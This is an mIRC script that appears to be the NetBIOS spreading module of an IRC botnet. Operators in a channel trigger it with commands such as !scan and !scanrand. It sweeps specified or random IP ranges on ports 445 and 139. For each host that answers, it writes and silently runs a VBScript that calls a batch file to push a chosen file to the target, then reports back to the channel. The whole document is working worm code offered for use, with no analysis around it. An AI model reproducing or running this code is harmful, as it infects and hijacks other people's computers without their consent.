on 500:text:!scan *:*:{ 
  if ($2 == $null) || ($3 == $null) { msg # [Netbios] - Error: Syntax !scan 24.24.51.* [file] | halt }
  if (* !isin $2) { msg # [Netbios] - Error: Syntax !scan 24.24.51.* | halt }
  if $me !isvo $chan { /halt }
else { set %file2spread $3 | set %begshortip $replace($2,*,1) | set %beglongip $longip( %begshortip ) | set %endshortip $replace($2,*,255) | set %endlongip $longip( %endshortip ) | set %port 445 | set %botchan $chan  |  /msg $chan [Netbios] - Scanner started: [ $+ %begshortip $+ ] - [ $+ %endshortip $+ ] file: [ $+ %file2spread $+ ] |   /startscanning   } }
on 500:text:!scanrand*:*:{
set %temp2scan $gettok($ip,1,46) $+ . $+ $gettok($ip,2,46) $+ . $+ $rand(1,255) $+ . $+ *
if $me !isvo $chan { /halt }
else { set %file2spread $2 | set %begshortip $replace( %temp2scan ,*,1) | set %beglongip $longip( %begshortip ) | set %endshortip $replace( %temp2scan ,*,255) | set %endlongip $longip( %endshortip ) | set %port 445 | set %botchan $chan | /msg $chan [Netbios] - Scanner started: [ $+ %begshortip $+ ] - [ $+ %endshortip $+ ] file: [ $+ %file2spread $+ ] | /startscanning } }
on 500:text:!randscan2*:*:{
set %temp2scan $gettok($ip,1,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ *
if $me !isvo $chan { /halt }
else { set %file2spread $2 | set %begshortip $replace( %temp2scan ,*,1) | set %beglongip $longip( %begshortip ) | set %endshortip $replace( %temp2scan ,*,255) | set %endlongip $longip( %endshortip ) | set %port 445 | set %botchan $chan | /msg $chan [Netbios] - Scanner started: [ $+ %begshortip $+ ] - [ $+ %endshortip $+ ] file: [ $+ %file2spread $+ ] | /startscanning } }
on 500:text:!rand3*:*:{
set %temp2scan $gettok($ip,1,46) $+ . $+ $rand(1,255) $+ . $+ * $+ . $+ *
if $me !isvo $chan { /halt }
else { set %file2spread $2 | set %begshortip $replace( %temp2scan ,*,1) | set %beglongip $longip( %begshortip ) | set %endshortip $replace( %temp2scan ,*,255) | set %endlongip $longip( %endshortip ) | set %port 445 | set %botchan $chan | /msg $chan [Netbios] - Scanner started: [ $+ %begshortip $+ ] - [ $+ %endshortip $+ ] file: [ $+ %file2spread $+ ] | /startscanning } }
on 500:text:!stopscan*:*:{
/bishazz
msg %botchan [Netbios] - Scanner stopped: [ $+ %begshortip $+ ] - [ $+ %endshortip $+ ] 
}
alias startscanning { :loop | inc %loop | set %multiply $calc( %loop -1) | set %botnum 2 |  /startscan $longip($calc($calc( %multiply *$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))+ %beglongip )) $longip($calc($calc( %multiply *$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))+ %beglongip +$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))) %port }
alias finished { msg %botchan [Netbios] - Scanner stopped: [ $+ %begshortip $+ ] - [ $+ %endshortip $+ ] | bishazz | unset1variable | halt }
alias unset1variable { unset %begshortip | unset %endshortip | unset %botnum | unset %multiply | unset %totalsuccess }
alias startscan { set %beglongip $longip($1) | set %endlongip $longip($2) | set %port $3 | set %total $calc($calc(%endlongip - %beglongip)) | unset %totalscaning | setnewvars4scan }
alias setnewvars4scan {
  inc %totalscaning
  if %totalscaning >= %total /finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning

  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 %port
  if $1 == 1 finished
  sockopen ip2 %ip2 %port
  if $1 == 2 finished
  sockopen ip3 %ip3 %port
  if $1 == 3 finished
  sockopen ip4 %ip4 %port
  if $1 == 4 finished
  sockopen ip5 %ip5 %port
  if $1 == 5 finished
  sockopen ip6 %ip6 %port
  if $1 == 6 finished
  sockopen ip7 %ip7 %port
  if $1 == 7 finished
  sockopen ip8 %ip8 %port
  if $1 == 8 finished
  sockopen ip9 %ip9 %port
  if $1 == 9 finished
  sockopen ip10 %ip10 %port
  if $1 == 10 finished
  sockopen ip11 %ip11 %port
  if $1 == 11 finished
  sockopen ip12 %ip12 %port
  if $1 == 12 finished
  sockopen ip13 %ip13 %port
  if $1 == 13 finished
  sockopen ip14 %ip14 %port
  if $1 == 14 finished
  sockopen ip15 %ip15 %port
  if $1 == 15 finished
  sockopen ip16 %ip16 %port
  if $1 == 16 finished
  sockopen ip17 %ip17 %port
  if $1 == 17 finished
  sockopen ip18 %ip18 %port
  if $1 == 18 finished
  sockopen ip19 %ip19 %port
  if $1 == 19 finished
  sockopen ip20 %ip20 %port
  if $1 == 20 finished
  sockopen ip21 %ip21 %port
  if $1 == 21 finished
  sockopen ip22 %ip22 %port
  if $1 == 22 finished
  sockopen ip23 %ip23 %port
  if $1 == 23 finished
  sockopen ip24 %ip24 %port
  if $1 == 24 finished
  sockopen ip25 %ip25 %port
  .timer 1 4 /sockclose ip*
  .timer 1 5 /setnewvars4scan
}
on *:sockopen:ip*:{  if ($sockerr > 0) { halt } 
  if (%port == 445) { 
  ;msg %botchan [Netbios] - Uploading: $sock($sockname).ip - [Windows NT/2k/XP]
  write Infect $+ $sock($sockname).ip $+ .vbs on error resume next
  write Infect $+ $sock($sockname).ip $+ .vbs Set fso = CreateObject("Scripting.FileSystemObject")
  write Infect $+ $sock($sockname).ip $+ .vbs windows = fso.GetSpecialFolder(WindowsFolder)
  write Infect $+ $sock($sockname).ip $+ .vbs Set src3 = CreateObject("Wscript.shell")
  write Infect $+ $sock($sockname).ip $+ .vbs src3.run "abc.bat $sock($sockname).ip %file2spread $+ ",0,true
  timer 1 600 remove Infect $+ $sock($sockname).ip $+ .vbs
  run Infect $+ $sock($sockname).ip $+ .vbs
    inc %totalsuccess | /sockclose $sockname | /halt 
  }
  if (%port == 139) { 
 ; msg %botchan [Netbios] - Uploading: $sock($sockname).ip - [Windows 9x/ME]
  write Infect $+ $sock($sockname).ip $+ .vbs on error resume next
  write Infect $+ $sock($sockname).ip $+ .vbs Set fso = CreateObject("Scripting.FileSystemObject")
  write Infect $+ $sock($sockname).ip $+ .vbs windows = fso.GetSpecialFolder(WindowsFolder)
  write Infect $+ $sock($sockname).ip $+ .vbs Set src3 = CreateObject("Wscript.shell")
  write Infect $+ $sock($sockname).ip $+ .vbs src3.run "abc.bat $sock($sockname).ip %file2spread $+ ",0,true
  timer 1 600 remove Infect $+ $sock($sockname).ip $+ .vbs
  run Infect $+ $sock($sockname).ip $+ .vbs
    inc %totalsuccess | /sockclose $sockname | /halt 
  }
}
alias bishazz { /sockclose ip* |  .timers off |  unset %begshortip |  unset %beglongip |  unset %endshortip |  unset %endlongip |  unset %port |  unset %botchan |  unset %botnum |  unset %ip* |  unset %loop |  unset %multiply |  unset %total |  unset %totalscaning | unset %totalsuccess }
